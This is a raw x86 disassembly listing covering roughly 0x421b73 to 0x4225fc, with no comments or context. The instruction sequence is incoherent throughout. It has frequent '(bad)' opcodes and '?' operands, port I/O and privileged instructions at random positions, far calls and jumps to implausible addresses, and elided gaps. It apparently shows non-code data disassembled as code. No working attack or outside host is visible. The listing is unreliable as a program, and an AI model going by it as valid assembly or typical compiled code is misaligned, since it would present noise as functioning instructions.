  421b73:	add    BYTE PTR [esi],dl
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     ah,BYTE PTR [ebx-0x44e27084]
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    eax,0x17000001
  421b8d:	and    eax,0xf0d71edb
  421b92:	cli    
  421b93:	push   ds
  421b94:	xor    al,0x45
  421b96:	out    dx,al
  421b97:	mov    edx,0xb12f52cd
  421b9c:	pop    esp
  421b9d:	inc    ebp
  421b9e:	mov    ch,BYTE PTR [ebx-0x28]
  421ba1:	pop    ds
  421ba2:	rcr    DWORD PTR [ebp-0x3292577f],0xce
  421ba9:	in     al,dx
  421baa:	mov    esp,0xf4573ac5
  421baf:	(bad)  
  421bb0:	mov    ch,0x91
  421bb2:	and    BYTE PTR [edx-0x77],bh
  421bb5:	sahf   
  421bb6:	(bad)  
  421bb7:	(bad)  [edi]
  421bb9:	addr16 inc ebp
  421bbb:	loop   0x421b3d
  421bbd:	push   ebp
  421bbe:	popf   
  421bbf:	pop    edx
  421bc0:	sbb    cl,BYTE PTR [edi+0x1f]
  421bc3:	hlt    
  421bc4:	sbb    ecx,DWORD PTR [edi-0x73104c32]
  421bca:	jmp    0x421b4d
  421bcc:	push   edx
  421bcd:	add    BYTE PTR [esi],0x14
  421bd0:	inc    esi
  421bd1:	mov    edi,fs
  421bd3:	mov    eax,ds:0xff046d7a
  421bd8:	xchg   ebp,eax
  421bd9:	shl    DWORD PTR gs:[ebx-0x3e],1
  421bdd:	push   edx
  421bde:	lock xor cl,ah
  421be1:	adc    al,0x9b
  421be3:	je     0x421bbc
  421be5:	aam    0x20
  421be7:	cli    
  421be8:	les    eax,FWORD PTR [ebx+0x1a5ef1ac]
  421bee:	add    bh,0x11
  421bf1:	lahf   
  421bf2:	push   ecx
  421bf3:	mov    dh,0x49
  421bf5:	mov    BYTE PTR [esi-0x7d72d152],dl
  421bfb:	scas   eax,DWORD PTR es:[edi]
  421bfc:	mov    ah,0x73
  421bfe:	jmp    0x47621fc4
  421c03:	(bad)  
  421c04:	div    bh
  421c06:	(bad)  
  421c07:	mov    al,0xa1
  421c09:	mov    ebx,0xabe1c83f
  421c0e:	out    0xe5,al
  421c10:	inc    ebp
  421c11:	and    cl,BYTE PTR [ecx]
  421c13:	xor    BYTE PTR [edx+0x68],cl
  421c16:	mov    DWORD PTR [edx+0x25],eax
  421c19:	xchg   edi,ebx
  421c1b:	aad    0x2c
  421c1d:	imul   BYTE PTR [ebx]
  421c1f:	aad    0xd8
  421c21:	sub    eax,DWORD PTR [edi-0x5b2d75f2]
  421c27:	cli    
  421c28:	(bad)  
  421c29:	ins    DWORD PTR es:[edi],dx
  421c2a:	add    BYTE PTR [edi],ch
  421c2c:	fstp   QWORD PTR [esi-0x41]
  421c2f:	(bad)  
  421c30:	test   DWORD PTR [ebx-0x37],0xc4c2679d
  421c37:	sub    bh,BYTE PTR ds:0x80656817
  421c3d:	jnp    0x421c47
  421c3f:	in     al,0xf5
  421c41:	sbb    BYTE PTR [edi+0x75],ah
  421c44:	push   edi
  421c45:	jns    0x421c28
  421c47:	adc    BYTE PTR [ebp+ebp*4+0x51],al
  421c4b:	mov    cl,ah
  421c4d:	lock or BYTE PTR [edx+0x1c5d76ee],cl
  421c54:	dec    edi
  421c55:	(bad)  
  421c56:	ret    
  421c57:	dec    ebx
  421c58:	cmp    eax,0xe793f3b3
  421c5d:	push   ecx
  421c5e:	sahf   
  421c5f:	leave  
  421c60:	sbb    eax,0x107874e8
  421c65:	aad    0x9b
  421c67:	aam    0x79
  421c69:	mov    esi,0xeb2b99ea
  421c6e:	or     esp,esi
  421c70:	add    cl,BYTE PTR [ebx]
  421c72:	je     0x421c29
  421c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c75:	mov    dl,0xe5
  421c77:	popf   
  421c78:	and    eax,0xaea6bee8
  421c7d:	inc    ecx
  421c7e:	loopne 0x421c10
  421c80:	push   eax
  421c81:	push   edx
  421c82:	aad    0x0
  421c84:	repnz add eax,0x66b8ac0
  421c8a:	lods   al,BYTE PTR ds:[esi]
  421c8b:	and    al,0xcb
  421c8d:	and    eax,0xb9e01e
	...
  421cf2:	add    BYTE PTR [eax],al
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	push   edx
  421d01:	adc    eax,0x68c0805f
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    eax,0xa4000001
  421d0d:	addr16 fs cmp al,al
  421d11:	jmp    0x421d75
  421d13:	imul   ecx,DWORD PTR [esi-0x440cd07d],0x2902ab01
  421d1d:	mov    al,0xc4
  421d20:	outs   dx,DWORD PTR ds:[esi]
  421d21:	arpl   WORD PTR ds:0x7e876c5a,di
  421d27:	xor    al,dh
  421d29:	fistp  WORD PTR ds:[edi+0x76]
  421d2d:	fld    st(5)
  421d2f:	sub    cl,BYTE PTR [edx]
  421d31:	out    0x85,eax
  421d33:	les    esp,FWORD PTR [edi+0x7]
  421d36:	mov    esi,0xdc8bd592
  421d3b:	xchg   esp,eax
  421d3c:	mov    al,0x0
  421d3e:	jae    0x421cf0
  421d40:	rol    dl,1
  421d42:	idiv   DWORD PTR [eax]
  421d44:	ret    0x1fca
  421d47:	repz adc ecx,DWORD PTR [eax]
  421d4a:	out    dx,eax
  421d4b:	push   ebx
  421d4c:	int    0x2a
  421d4e:	or     al,0x4f
  421d50:	fbstp  TBYTE PTR [eax]
  421d52:	retf   0x1205
  421d55:	pop    edi
  421d56:	jae    0x421d9a
  421d58:	adc    DWORD PTR [ebp+0x2a],esi
  421d5b:	add    eax,0xc657b2c8
  421d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d61:	imul   edi,ecx,0x596953bd
  421d67:	imul   eax,DWORD PTR [ebx-0x4b],0xb227ea2
  421d6e:	mov    bl,0x3a
  421d70:	int    0x98
  421d72:	mov    ecx,DWORD PTR [esi+0x53]
  421d75:	imul   ebx,eax,0xc597fd64
  421d7b:	inc    ebx
  421d7c:	dec    eax
  421d7d:	jo     0x421db8
  421d7f:	mov    edx,0xcbd63c0f
  421d84:	cmc    
  421d85:	push   es
  421d86:	and    DWORD PTR [ebx-0x2001e5b],esi
  421d8c:	in     al,0xdb
  421d8e:	xchg   ebx,eax
  421d8f:	data16 (bad) 
  421d91:	push   0x3e678e0
  421d96:	jecxz  0x421dcd
  421d98:	mov    ebp,0x9058cd46
  421d9d:	and    dl,0xc4
  421da0:	jo     0x421db1
  421da2:	mov    dl,0xc9
  421da4:	mov    bl,0x19
  421da6:	mov    al,ds:0xaf1dbd34
  421dab:	pop    ebp
  421dac:	jne    0x421de5
  421dae:	sub    ch,ah
  421db0:	adc    eax,0xc3385893
  421db5:	mov    ?,edx
  421db7:	sub    esi,DWORD PTR [ebx+0x3a]
  421dba:	dec    edi
  421dbb:	dec    eax
  421dbc:	nop
  421dbd:	test   al,0xdd
  421dbf:	dec    esp
  421dc0:	scas   al,BYTE PTR es:[edi]
  421dc1:	js     0x421e06
  421dc3:	repz and cl,BYTE PTR ds:0x61b8aa15
  421dca:	jo     0x421dd7
  421dcc:	cld    
  421dcd:	xor    edx,0x3a
  421dd0:	xchg   DWORD PTR [ebp+0xdb45975],esi
  421dd6:	retf   
  421dd7:	clc    
  421dd8:	cmp    BYTE PTR [ebx],dl
  421dda:	jge    0x421dd1
  421ddc:	xlat   BYTE PTR ds:[ebx]
  421ddd:	add    edx,DWORD PTR [ebx]
  421ddf:	es out 0x4,eax
  421de2:	popf   
  421de3:	repnz lds ecx,FWORD PTR [esi-0x6d230af7]
  421dea:	fldcw  WORD PTR [eax-0x60]
  421ded:	pop    ds
  421dee:	inc    ecx
  421def:	fidiv  DWORD PTR [edi]
  421df1:	jg     0x421e56
  421df3:	mov    ecx,0xd5c88f0f
  421df8:	sbb    DWORD PTR [ecx+0x72b86110],esp
  421dfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dff:	outs   dx,DWORD PTR ds:[esi]
  421e00:	outs   dx,BYTE PTR ds:[esi]
  421e01:	clc    
  421e02:	loop   0x421e02
  421e04:	inc    ebx
  421e05:	mov    cl,0x35
  421e07:	mov    ebp,DWORD PTR [eax+0x1796d60d]
  421e0d:	add    al,0x67
  421e0f:	div    BYTE PTR [esi+0x0]
	...
  421e72:	add    BYTE PTR [eax],al
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	pushf  
  421e81:	xlat   BYTE PTR ds:[ebx]
  421e82:	dec    edx
  421e83:	mov    cl,0xc5
  421e85:	imul   eax,DWORD PTR [ecx],0x10500
  421e8b:	add    bl,ah
  421e8d:	mov    edx,0x8a39602f
  421e92:	stos   DWORD PTR es:[edi],eax
  421e93:	bound  ebp,QWORD PTR [ecx]
  421e95:	fldcw  WORD PTR [eax+0x74]
  421e98:	cmp    eax,0xbd99e847
  421e9d:	loope  0x421e2d
  421e9f:	cld    
  421ea0:	mov    ch,0xe5
  421ea2:	fwait
  421ea3:	jnp    0x421ecb
  421ea5:	call   0xed472ff0
  421eaa:	mov    bl,0x32
  421eac:	fcomp  QWORD PTR [edx]
  421eae:	push   eax
  421eaf:	outs   dx,BYTE PTR ds:[esi]
  421eb0:	xchg   DWORD PTR [ebx+eax*2-0x432a1bc1],ecx
  421eb7:	popf   
  421eb8:	adc    al,0x13
  421eba:	mov    esp,0x24ddd531
  421ebf:	(bad)  
  421ec0:	fcom   st(4)
  421ec2:	and    ecx,DWORD PTR [ebp+0x5bb0c4c6]
  421ec8:	xchg   DWORD PTR [eax-0x6e7b79b6],edx
  421ece:	out    dx,al
  421ecf:	hlt    
  421ed0:	pop    ds
  421ed1:	xchg   ebp,eax
  421ed2:	aam    0xc2
  421ed4:	sbb    ah,al
  421ed6:	fist   DWORD PTR [esi]
  421ed8:	push   edi
  421ed9:	or     eax,0xc28d06d8
  421ede:	in     al,0xf2
  421ee0:	dec    edx
  421ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ee2:	jle    0x421e9a
  421ee4:	aaa    
  421ee5:	(bad)  
  421ee6:	popa   
  421ee7:	mov    edx,0xdaff1571
  421eec:	inc    ecx
  421eed:	jnp    0x421e7b
  421eef:	add    BYTE PTR [eax-0x58],cl
  421ef2:	aas    
  421ef3:	lods   eax,DWORD PTR ds:[esi]
  421ef4:	mov    DWORD PTR [eax-0x6104b891],ecx
  421efa:	mov    esp,0x5e4a73b
  421eff:	adc    BYTE PTR [edi+ebp*1+0x31c37b4c],bl
  421f06:	mov    bl,0xa3
  421f08:	mov    ch,0x6a
  421f0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f0b:	xor    BYTE PTR [ebp+0x1b],al
  421f0e:	daa    
  421f0f:	stc    
  421f10:	push   ebx
  421f11:	xor    BYTE PTR [esi+0x43],bl
  421f14:	push   0xffffffcd
  421f16:	loop   0x421f22
  421f18:	into   
  421f19:	js     0x421ebb
  421f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f1c:	mov    ecx,0xd3f2ba72
  421f21:	mov    WORD PTR [ebx],?
  421f23:	adc    eax,0xe56a7515
  421f28:	inc    ecx
  421f29:	in     eax,dx
  421f2a:	push   ebx
  421f2b:	cmc    
  421f2c:	sti    
  421f2d:	rcl    BYTE PTR [ecx+0x1681c196],0xb9
  421f34:	out    0x11,eax
  421f36:	outs   dx,DWORD PTR ds:[esi]
  421f37:	fnstenv [edx+0x2da1946f]
  421f3d:	(bad)  
  421f3e:	fiadd  WORD PTR [esi-0x3c]
  421f41:	add    ebx,DWORD PTR [edx]
  421f43:	mov    bl,0x38
  421f45:	push   esp
  421f46:	sbb    DWORD PTR [esi+0x71a4aa1f],ecx
  421f4c:	sbb    DWORD PTR [ebp+0x1c],edi
  421f4f:	jbe    0x421f46
  421f51:	sbb    al,0xe4
  421f53:	ret    0x1416
  421f56:	xor    edx,DWORD PTR [edi]
  421f58:	or     al,BYTE PTR [ecx]
  421f5a:	ja     0x421f27
  421f5c:	cmc    
  421f5d:	bound  edi,QWORD PTR [edi-0x5ae3a9a]
  421f63:	aam    0x72
  421f65:	in     eax,0x17
  421f67:	xchg   dh,ch
  421f69:	mov    dh,dh
  421f6b:	mov    dh,0x8a
  421f6d:	ret    
  421f6e:	je     0x421f2f
  421f70:	pushf  
  421f71:	cwde   
  421f72:	test   eax,0x5e8c449c
  421f77:	cmp    BYTE PTR [ecx],dh
  421f79:	int    0x3f
  421f7b:	dec    ecx
  421f7c:	in     al,0x7a
  421f7e:	hlt    
  421f7f:	gs in  al,dx
  421f81:	sub    DWORD PTR [ecx+0x30],ebx
  421f84:	xor    ch,BYTE PTR [ebp-0x16]
  421f87:	pop    edi
  421f88:	mov    dl,0x41
  421f8a:	pop    ecx
  421f8b:	cmovo  esp,DWORD PTR ds:0xcf77ab
	...
  421ff2:	add    BYTE PTR [eax],al
  421ff4:	imul   eax,DWORD PTR [esi],0xffffff8f
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  422002:	xor    al,0xe8
  422004:	retf   0x16a
  422007:	add    BYTE PTR ds:0x23000001,al
  42200d:	imul   esp,edx
  422010:	jnp    0x421f94
  422012:	and    BYTE PTR [esi],bh
  422014:	stos   DWORD PTR es:[edi],eax
  422015:	stos   BYTE PTR es:[edi],al
  422016:	push   es
  422017:	push   ecx
  422018:	jno    0x422069
  42201a:	shl    BYTE PTR [edx-0x24c8ee85],0xd2
  422021:	jg     0x42209b
  422023:	test   dh,0x21
  422026:	xchg   ecx,eax
  422027:	pop    edi
  422028:	leave  
  422029:	mov    ds:0xa04e0af,eax
  42202e:	loope  0x421fca
  422030:	imul   ebx,DWORD PTR [eax+0x33],0x411d302
  422037:	and    DWORD PTR [ebp+0x28],0x39
  42203b:	call   0xc13ea651
  422040:	pop    es
  422041:	ins    DWORD PTR es:[edi],dx
  422042:	fucom  st(3)
  422044:	pusha  
  422045:	push   ebp
  422046:	cld    
  422047:	enter  0x516a,0x1b
  42204b:	or     bh,BYTE PTR [edx+eax*2]
  42204e:	mov    edi,0x98c6cfb8
  422053:	adc    eax,0xba71692a
  422058:	aad    0xae
  42205a:	shl    BYTE PTR [esi-0x71],0xbf
  42205e:	mov    DWORD PTR [edi+0x739e9a40],ebp
  422064:	aam    0x74
  422066:	retf   0x920c
  422069:	(bad)  
  42206a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42206b:	or     eax,0x514ad759
  422070:	sub    eax,0x325d4155
  422075:	cmp    al,0x0
  422077:	mov    eax,0x3a7570e5
  42207c:	sbb    BYTE PTR [ebx-0x45f7d6cf],al
  422082:	aad    0x31
  422084:	nop
  422085:	jecxz  0x4220d5
  422087:	xor    al,0xf4
  422089:	loopne 0x42202c
  42208b:	adc    BYTE PTR [ebp+0x243f7c47],bh
  422091:	mov    cs,WORD PTR [ecx+0x61]
  422094:	icebp  
  422095:	xchg   ecx,eax
  422096:	jmp    0x788054fc
  42209b:	xor    eax,DWORD PTR [edi]
  42209d:	fsub   DWORD PTR [ecx]
  42209f:	cmp    eax,0x48ad8de3
  4220a4:	xchg   edi,eax
  4220a5:	iret   
  4220a6:	inc    esp
  4220a7:	sub    DWORD PTR [esi-0x27],esi
  4220aa:	mov    ?,WORD PTR [ecx+0x13fa94c5]
  4220b0:	pop    ss
  4220b1:	sbb    dh,0x67
  4220b4:	lds    edx,FWORD PTR [edx+0x1d]
  4220b7:	mov    dl,0xa4
  4220b9:	pusha  
  4220ba:	in     al,0x79
  4220bc:	mov    ch,0xf2
  4220be:	(bad)  
  4220bf:	hlt    
  4220c0:	ror    DWORD PTR [edx],1
  4220c2:	in     al,dx
  4220c3:	lahf   
  4220c4:	or     BYTE PTR [ecx+ecx*1+0x48c38b62],dl
  4220cb:	mov    ecx,0x9b1f2b69
  4220d0:	pusha  
  4220d1:	push   0xffffffbb
  4220d3:	pop    esp
  4220d4:	ror    ecx,1
  4220d6:	out    0xb,eax
  4220d8:	sbb    ebp,DWORD PTR [eax-0x7dc63b41]
  4220de:	jo     0x4220e3
  4220e0:	mov    WORD PTR [esi-0x3ead971],gs
  4220e6:	xor    eax,0xf9916ba2
  4220eb:	pusha  
  4220ec:	add    BYTE PTR gs:[eax-0x77],bl
  4220f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220f1:	scas   eax,DWORD PTR es:[edi]
  4220f2:	adc    eax,0x90ab9c97
  4220f7:	xor    BYTE PTR ds:0xc8c5fb7e,0x57
  4220fe:	cmp    al,0xc8
  422100:	jno    0x4220f2
  422102:	repnz into 
  422104:	add    BYTE PTR [edx],0x84
  422107:	or     eax,0x8ccdbf37
  42210c:	popf   
  42210d:	xchg   edx,eax
  42210e:	jmp    0x430196
	...
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    esi,DWORD PTR [edx]
  422181:	ficom  DWORD PTR [ecx+0x16bcf23]
  422187:	add    BYTE PTR ds:0xad000001,al
  42218d:	mov    bh,0x8b
  42218f:	ror    BYTE PTR [eax],cl
  422191:	xchg   ecx,ebp
  422193:	es test al,0x31
  422196:	test   eax,0xe9f2b09b
  42219b:	shl    DWORD PTR [ebp-0x41],0xf9
  42219f:	dec    edi
  4221a0:	test   DWORD PTR [esi-0x60ee3f9b],ebp
  4221a6:	(bad)  
  4221a7:	mov    edx,0x73addb7e
  4221ac:	loope  0x42217d
  4221ae:	xor    ebp,edi
  4221b0:	aaa    
  4221b1:	mov    al,0x1e
  4221b3:	or     al,BYTE PTR [edi+0x25683ecc]
  4221b9:	and    DWORD PTR [edi-0x6495af15],ebx
  4221bf:	cmp    BYTE PTR [ecx+0x40c5bfec],dl
  4221c5:	mov    ebp,0x1517eb8a
  4221ca:	mov    cl,0x56
  4221cc:	and    DWORD PTR [bx+0x898],edx
  4221d1:	pop    eax
  4221d2:	mov    esi,DWORD PTR [ecx*8+0x6fe13723]
  4221d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221da:	cmp    BYTE PTR [edi+0x6ff5217a],0x5f
  4221e1:	rcr    DWORD PTR [esi],cl
  4221e3:	mov    bl,0xa9
  4221e5:	jl     0x422240
  4221e7:	js     0x422195
  4221e9:	cs inc esp
  4221eb:	rcl    BYTE PTR [esi+edi*2],cl
  4221ee:	adc    al,0xfa
  4221f0:	out    0xa9,al
  4221f2:	icebp  
  4221f3:	mov    ch,0x11
  4221f5:	lock ins BYTE PTR es:[edi],dx
  4221f7:	and    esi,esp
  4221f9:	(bad)  
  4221fa:	pop    ds
  4221fb:	jns    0x422273
  4221fd:	xchg   ebp,eax
  4221fe:	ret    
  4221ff:	mov    eax,ds:0xe2d0cda4
  422204:	mov    DWORD PTR [esi-0x56219172],ebx
  42220a:	sub    BYTE PTR [ebx+eax*1+0x6a4c330a],al
  422211:	pop    ecx
  422212:	outs   dx,DWORD PTR ds:[esi]
  422213:	dec    esp
  422214:	paddq  mm7,QWORD PTR [edx+0x25d92dd4]
  42221b:	std    
  42221c:	and    eax,0x796de5ac
  422221:	sbb    BYTE PTR [eax-0x4a400ad0],dl
  422227:	mov    dh,BYTE PTR [eax+ebx*1]
  42222a:	dec    edx
  42222b:	cwde   
  42222c:	dec    esi
  42222d:	adc    DWORD PTR [bx+di-0x7422],0x4e
  422233:	push   esp
  422234:	sbb    DWORD PTR [eax-0x59],edx
  422237:	shl    BYTE PTR [ecx-0x43],0xe3
  42223b:	test   BYTE PTR [ebx-0x1e],ah
  42223e:	clc    
  42223f:	lahf   
  422240:	dec    esi
  422241:	or     bh,dh
  422243:	jno    0x42225d
  422245:	popa   
  422246:	jl     0x422264
  422248:	bnd jnp 0x422214
  42224b:	std    
  42224c:	sub    DWORD PTR [esi-0x68],ebp
  42224f:	add    BYTE PTR [ecx],0x85
  422252:	nop
  422253:	adc    ch,BYTE PTR [esi+0x79]
  422256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422257:	jb     0x42224e
  422259:	jbe    0x422233
  42225b:	cmp    BYTE PTR [edx-0x5f1dd2ee],ah
  422261:	cdq    
  422262:	push   ebx
  422263:	lock jmp 0x4222d6
  422266:	fs xchg ecx,eax
  422268:	retf   0xc4f1
  42226b:	jne    0x4222b3
  42226d:	mov    edi,0x31f279f4
  422272:	xchg   ebp,eax
  422273:	inc    edx
  422274:	sub    DWORD PTR [esi+0x36bd93da],ebx
  42227a:	or     esi,DWORD PTR [esi-0x7d899fb6]
  422280:	mov    DWORD PTR fs:[eax],esp
  422283:	pop    eax
  422284:	out    0x70,eax
  422286:	sti    
  422287:	icebp  
  422288:	pop    ds
  422289:	shr    DWORD PTR [eax+0x67],0x1a
  42228d:	test   al,0x37
  42228f:	les    eax,FWORD PTR [esi]
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	sbb    eax,DWORD PTR [ebp-0x80]
  422303:	adc    esp,0x500016c
  422309:	add    DWORD PTR [eax],eax
  42230b:	add    BYTE PTR [edi+0x55d5c42e],bl
  422311:	(bad)  
  422313:	sub    ah,dh
  422315:	pop    ss
  422316:	aad    0x98
  422318:	add    ah,BYTE PTR [esi+0x5b5af6a6]
  42231e:	fstp   DWORD PTR [esi+0x70c27824]
  422324:	xchg   esi,eax
  422325:	jge    0x422367
  422327:	pop    esp
  422328:	mov    esp,DWORD PTR [ebp+0x38574703]
  42232e:	add    bh,BYTE PTR [eax+edi*4+0x6b]
  422332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422333:	ins    BYTE PTR es:[edi],dx
  422334:	mov    ebx,0xe3bd8a1b
  422339:	or     ebx,DWORD PTR [ebx+0x39]
  42233c:	int    0x25
  42233e:	lahf   
  42233f:	push   0x34
  422341:	(bad)  
  422342:	pop    eax
  422343:	cmp    BYTE PTR [esi-0x6fe16374],cl
  422349:	cmp    BYTE PTR [edi-0x63420073],0x8d
  422350:	lsl    edi,WORD PTR [ebp-0x40]
  422354:	or     eax,esi
  422356:	xchg   ecx,eax
  422357:	test   BYTE PTR [eax+0x249eb061],dh
  42235d:	popf   
  42235e:	push   ecx
  42235f:	and    BYTE PTR [esi-0x56],dh
  422362:	jns    0x422354
  422364:	(bad)  
  422365:	sub    DWORD PTR [ebp+0x65],eax
  422368:	mov    ah,0xc8
  42236a:	mov    WORD PTR [eax+esi*1+0x79],ds
  42236e:	loopne 0x422357
  422370:	mov    BYTE PTR [ecx+0x39],0xba
  422374:	pop    ebp
  422375:	sbb    eax,0xa9dd0888
  42237a:	pushf  
  42237b:	mov    ds:0x8402cc2c,al
  422380:	stos   DWORD PTR es:[edi],eax
  422381:	jl     0x422304
  422383:	cmp    eax,0x23a1ab8f
  422388:	into   
  422389:	ja     0x422378
  42238b:	inc    esp
  42238c:	push   ebx
  42238d:	adc    DWORD PTR [esi+0x84c8abe],ecx
  422393:	out    0xe5,eax
  422395:	cdq    
  422396:	push   es
  422397:	cvtpi2ps xmm1,QWORD PTR [ebx+ebx*8+0x75]
  42239c:	sbb    al,BYTE PTR [edx+eax*4-0x15]
  4223a0:	retf   
  4223a1:	lds    esp,FWORD PTR [ebx-0x512a1438]
  4223a7:	jmp    0xcdf62b13
  4223ac:	fs jle 0x422375
  4223af:	jb     0x42233e
  4223b1:	and    ah,ah
  4223b3:	add    eax,0x3c19b0cc
  4223b8:	movhlps xmm5,xmm4
  4223bb:	int3   
  4223bc:	es push ebp
  4223be:	jnp    0x422403
  4223c0:	add    al,BYTE PTR [esi]
  4223c2:	call   0x67b3813f
  4223c7:	dec    ebx
  4223c8:	iret   
  4223c9:	fld    TBYTE PTR es:[edx+0x27]
  4223cd:	inc    edi
  4223ce:	sbb    ch,bh
  4223d0:	dec    ebx
  4223d1:	xor    ch,BYTE PTR [ebx+0x6b88ffff]
  4223d7:	jmp    0x6926260
  4223dc:	jl     0x422441
  4223de:	xor    ebp,DWORD PTR [esi+0x2e38861]
  4223e4:	in     al,dx
  4223e5:	pushf  
  4223e6:	lahf   
  4223e7:	nop
  4223e8:	sub    al,0x4
  4223ea:	sbb    eax,0x745b2f8a
  4223ef:	xor    esi,esi
  4223f1:	jg     0x4223d2
  4223f3:	adc    dl,BYTE PTR [ecx-0x6f8abeb]
  4223f9:	aad    0xf5
  4223fb:	popa   
  4223fc:	sub    eax,0x16332b3
  422401:	mov    dl,0x40
  422403:	jno    0x422477
  422405:	pop    ebx
  422406:	aad    0xd9
  422408:	and    BYTE PTR ds:0x6ed629b,bh
  42240e:	out    dx,al
  42240f:	pop    edi
  422410:	mov    ch,0x0
	...
  422472:	add    BYTE PTR [eax],al
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	xchg   ebx,eax
  422481:	das    
  422482:	loope  0x4224c1
  422484:	fldcw  WORD PTR [ebp+0x1]
  422487:	add    BYTE PTR ds:0x29000001,al
  42248d:	mov    eax,0x32f68dd0
  422492:	xor    esi,DWORD PTR [ecx]
  422494:	dec    ebx
  422495:	xlat   BYTE PTR ds:[ebx]
  422496:	pop    es
  422497:	or     BYTE PTR [eax-0x60],bl
  42249a:	aad    0x88
  42249c:	push   ss
  42249d:	add    eax,0xbe775a98
  4224a2:	lock sub dh,BYTE PTR [edi-0x586b2227]
  4224a9:	lods   eax,DWORD PTR ds:[esi]
  4224aa:	fwait
  4224ab:	and    BYTE PTR [edx-0x2c5f5c6d],dh
  4224b1:	mov    edx,gs
  4224b3:	ja     0x42248b
  4224b5:	mov    al,BYTE PTR [edx-0x2aa046a7]
  4224bb:	sub    al,0x39
  4224bd:	fadd   st(1),st
  4224bf:	xchg   ecx,eax
  4224c0:	call   0x1ada:0xcf3d32a4
  4224c7:	es ret 
  4224c9:	ins    DWORD PTR es:[edi],dx
  4224ca:	sbb    al,0xbf
  4224cc:	push   cs
  4224cd:	ss pusha 
  4224cf:	fwait
  4224d0:	mov    bl,0x3f
  4224d2:	ss (bad) 
  4224d4:	lock pop ebp
  4224d6:	cmc    
  4224d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224d8:	xchg   ebp,eax
  4224d9:	or     bl,0x1d
  4224dc:	cmp    DWORD PTR ds:0x5320cb15,edx
  4224e2:	mov    ds:0x6aee7aef,eax
  4224e7:	push   ebx
  4224e8:	pop    eax
  4224e9:	jg     0x4224f6
  4224eb:	scas   eax,DWORD PTR es:[edi]
  4224ec:	stc    
  4224ed:	mov    esp,0xff575dd0
  4224f2:	fldenv [edi-0x7acfdcc9]
  4224f8:	aas    
  4224f9:	mov    dh,0x90
  4224fb:	mov    edi,0x35bd704
  422500:	leave  
  422501:	dec    edx
  422502:	call   0x36e6:0x5bbe34dc
  422509:	push   ecx
  42250a:	repnz not al
  42250d:	jg     0x4224b8
  42250f:	stc    
  422510:	inc    esi
  422511:	ret    0x35cc
  422514:	imul   ebp,DWORD PTR [ebx+0x670675d3],0xb
  42251b:	or     eax,0x5a3650f4
  422520:	and    eax,DWORD PTR [eax+0x20]
  422523:	mov    esi,esi
  422525:	cmp    eax,0x1f4236fa
  42252a:	fnstcw WORD PTR [ebp-0x6f]
  42252d:	push   ebp
  42252e:	xchg   esi,eax
  42252f:	jge    0x42257d
  422531:	xchg   ebx,eax
  422532:	pop    ebp
  422533:	adc    eax,0x322093c8
  422538:	add    dl,BYTE PTR ds:0x29ed075a
  42253e:	jg     0x422537
  422540:	jg     0x422540
  422542:	xchg   esi,eax
  422543:	xor    DWORD PTR [edx-0x7e],ebx
  422546:	(bad)  
  422548:	and    al,0x41
  42254a:	leave  
  42254b:	push   eax
  42254c:	jo     0x422588
  42254e:	jnp    0x4224d4
  422550:	jge    0x4225ac
  422552:	retf   0x6877
  422555:	add    ecx,DWORD PTR [edi-0x57cd4e18]
  42255b:	dec    edx
  42255c:	mov    eax,0x1077a3bf
  422561:	ins    BYTE PTR es:[edi],dx
  422562:	arpl   WORD PTR [ebx+0x442d16ad],di
  422568:	push   eax
  422569:	loope  0x422592
  42256b:	out    dx,al
  42256c:	add    ebp,esi
  42256e:	push   edi
  42256f:	xor    al,0x33
  422571:	nop
  422572:	shl    bl,cl
  422574:	es icebp 
  422576:	xchg   BYTE PTR [edi],al
  422578:	jne    0x422532
  42257a:	fcom   DWORD PTR [edi]
  42257c:	ror    ch,1
  42257e:	add    WORD PTR [ecx],ax
  422581:	aam    0x5b
  422583:	and    al,0xf0
  422585:	fimul  DWORD PTR [edx-0x6c]
  422588:	call   FWORD PTR [esi]
  42258a:	lock sbb DWORD PTR [edx+ebx*8-0x35],0xffffffc5
  422590:	mov    bl,0x0
	...
  4225f2:	add    BYTE PTR [eax],al
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x456ba2f8]
